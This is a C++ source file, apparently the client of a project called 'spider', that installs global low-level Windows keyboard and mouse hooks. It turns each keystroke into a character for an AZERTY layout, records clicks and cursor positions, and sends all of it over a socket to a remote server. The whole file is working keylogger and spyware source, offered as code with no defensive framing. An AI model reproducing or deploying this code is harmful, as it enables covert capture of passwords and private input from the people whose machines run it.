#include "client/WindowsInputHandler.hpp"
#include "spider/packetSerializer.hpp"
#include "spider/protocol.hpp"
#include <iostream>
#include <string.h>

namespace spider
{
	HHOOK WindowsInputHandler::_keyboardHook;
	HHOOK WindowsInputHandler::_mouseHook;

	WindowsInputHandler::WindowsInputHandler(LPVOID lpParam)
	{
		_isLogging = false;
		_lpParam = lpParam;
		_hInstance = GetModuleHandle(NULL);
		if (!_hInstance)
			_hInstance = LoadLibrary((LPCSTR)lpParam);
	}

	WindowsInputHandler::~WindowsInputHandler()
	{
		if (_isLogging)
		{
			_unregisterKeyboardHook();
			_unregisterMouseHook();
		}
	}

	//
	// PUBLIC
	//

	int WindowsInputHandler::startLogging(bool keyboard, bool mouse)
	{
		if (!_hInstance)
			return 1;

		if (!_isLogging)
		{
			_registerKeyboardHook();
			_registerMouseHook();
			_isLogging = true;
		}
		return 0;
	}

	int WindowsInputHandler::stopLogging(bool keyboard, bool mouse)
	{
		if (_isLogging)
		{
			_unregisterKeyboardHook();
			_unregisterMouseHook();
			_isLogging = false;
			return 0;
		}
		return 1;
	}

	bool WindowsInputHandler::isLogging() const
	{
		return _isLogging;
	}

	//
	// PRIVATE
	//

	int WindowsInputHandler::_registerKeyboardHook()
	{
		_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyboardProc, _hInstance, NULL);
		return 0;
	}

	int WindowsInputHandler::_registerMouseHook()
	{
		_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)mouseProc, _hInstance, NULL);
		return 0;
	}

	int WindowsInputHandler::_unregisterKeyboardHook()
	{
		UnhookWindowsHookEx(_keyboardHook);
		return 0;
	}

	int WindowsInputHandler::_unregisterMouseHook()
	{
		UnhookWindowsHookEx(_mouseHook);
		return 0;
	}

	//
	// STATIC
	//

	LRESULT CALLBACK WindowsInputHandler::keyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
	{
		static bool shiftPressed = GetKeyState(VK_SHIFT) < 0;
		static bool capsLockOn = GetKeyState(VK_CAPITAL) < 0;
		static bool leftAlt = GetKeyState(VK_RMENU) < 0 && GetKeyState(VK_CONTROL) < 0;
		static char normalSymbols[20] = { '&', 'é', '"', 39, '(', '-', 'è', '_', 'ç', 'à', ')', '=', '^', '$', 'ù', '*', ',', ';', ':', '!' };
		static char shiftedSymbols[20] = { '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '°', '+', '¨', '£', '%', 'µ', '?', '.', '/', '§' };
		static char altedSymbols[20] = { 0, '~', '#', '{', '[', '|', '`', '\\', '^', '@', ']', '}', 0, '¤', 0, 0, 0, 0, 0, 0 };

		KBDLLHOOKSTRUCT hookedKey = *((KBDLLHOOKSTRUCT*)lParam);
		int keyPressed = hookedKey.vkCode;

		std::cout << "test" << std::endl;

		if (wParam == WM_SYSKEYDOWN ||wParam == WM_KEYDOWN)
		{
			if (hookedKey.vkCode == VK_LSHIFT || hookedKey.vkCode == VK_RSHIFT)
				shiftPressed = true;
			else if (hookedKey.vkCode == VK_CAPITAL)
				capsLockOn = !capsLockOn;
			else if (hookedKey.vkCode == VK_RMENU)
				leftAlt = true;
			else
			{
				DWORD word = 1;
				word += hookedKey.scanCode << 16;
				word += hookedKey.flags << 24;
				char buffer[1024] = { 0 };
				GetKeyNameText(word, (LPSTR)buffer, 0xFF);

				PackageCMDKeyboardTouch *keyStruct = new PackageCMDKeyboardTouch();
				strncpy(keyStruct->cmd, "TOC", 3);
				keyStruct->timestamp = hookedKey.time;

				if (strlen(buffer) == 1 && (buffer[0] >= 'A' && buffer[0] <= 'Z') && !(shiftPressed ^ capsLockOn))
					buffer[0] += 32;
				else if (strlen(buffer) == 1)
				{
					char *end = std::end(normalSymbols);
					char *index = std::find(std::begin(normalSymbols), end, buffer[0]);
					if (index != end)
					{
						if ((shiftPressed ^ capsLockOn))
							buffer[0] = shiftedSymbols[std::distance(normalSymbols, index)];
						else if (leftAlt && altedSymbols[std::distance(normalSymbols, index)])
							buffer[0] = altedSymbols[std::distance(normalSymbols, index)];
					}
				}
				strncpy(keyStruct->id, buffer, 30);
				std::cout << hookedKey.time << " key = " << keyStruct->id  << std::endl;
				sock.write<PackageCMDKeyboardTouch>(spider::PacketSerializer<PackageCMDKeyboardTouch>(
					sizeof(PackageHeader) + sizeof(PackageCMDKeyboardTouch), 666, *keyStruct));
			}
		}
		else if ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP))
		{
			if (hookedKey.vkCode == VK_LSHIFT || hookedKey.vkCode == VK_RSHIFT)
				shiftPressed = false;
			else if (hookedKey.vkCode == VK_RMENU)
				leftAlt = false;
		}

		return CallNextHookEx(spider::WindowsInputHandler::_keyboardHook, nCode, wParam, lParam);
	}

	LRESULT CALLBACK WindowsInputHandler::mouseProc(int nCode, WPARAM wParam, LPARAM lParam)
	{
		PackageCMDMouseClic *mouseClic = new PackageCMDMouseClic();
		PackageCMDMouseMove *mouseMove = new PackageCMDMouseMove();
		MSLLHOOKSTRUCT hookedMouse = *((MSLLHOOKSTRUCT*)lParam);
		POINT p;

		std::cout << hookedMouse.time;

		GetCursorPos(&p);
		if (wParam == WM_RBUTTONDOWN || wParam == WM_LBUTTONDOWN)
		{
			strncpy(mouseClic->id, (wParam == WM_RBUTTONDOWN ? "RIGHT CLIC" : "LEFT CLIC"), 11);
			strncpy(mouseClic->cmd, "CLC", 3);
			mouseClic->timestamp = hookedMouse.time;
			mouseClic->x = p.x;
			mouseClic->y = p.y;
			sock.write<PackageCMDMouseClic>(spider::PacketSerializer<PackageCMDMouseClic>(
				sizeof(PackageHeader) + sizeof(PackageCMDMouseClic), 666, *mouseClic));
			//std::cout << " Right click ";
		}
		else
		{
			strncpy(mouseMove->cmd, "MVT", 3);
			mouseMove->timestamp = hookedMouse.time;
			mouseMove->x = p.x;
			mouseMove->y = p.y;
			sock.write<PackageCMDMouseMove>(spider::PacketSerializer<PackageCMDMouseMove>(
				sizeof(PackageHeader) + sizeof(PackageCMDMouseMove), 666, *mouseMove));
			//std::cout << " Movement ";
		}
		//std::cout << "x = " << p.x << " y = " << p.y << std::endl;
		return CallNextHookEx(spider::WindowsInputHandler::_mouseHook, nCode, wParam, lParam);
	}

	bool WindowsInputHandler::isAsyncKeyDown(int key)
	{
		return (GetAsyncKeyState(key) & (1 << 16));
	}

	bool WindowsInputHandler::isKeyDown(int key)
	{
		return (GetKeyState(key) & (1 << 16));
	}
}